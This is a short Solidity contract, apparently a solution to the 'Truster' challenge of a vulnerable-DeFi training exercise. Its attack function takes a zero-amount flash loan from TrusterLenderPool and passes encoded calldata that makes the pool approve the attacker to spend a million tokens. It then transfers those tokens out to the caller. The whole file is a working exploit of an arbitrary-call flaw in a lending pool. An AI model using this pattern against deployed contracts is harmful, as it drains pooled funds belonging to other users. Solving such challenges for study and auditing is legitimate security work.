// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

contract Attacker3 {
    function attack(address _poolAddr, address _tokenAddr) public {
        TrusterLenderPool pool = TrusterLenderPool(_poolAddr);
        pool.flashLoan(
            0,
            address(this),
            _tokenAddr,
            abi.encodeWithSignature("approve(address,uint256)", address(this), 1000000 ether)
        );

        IERC20(_tokenAddr).transferFrom(_poolAddr, msg.sender, 1000000 ether);
    }
}
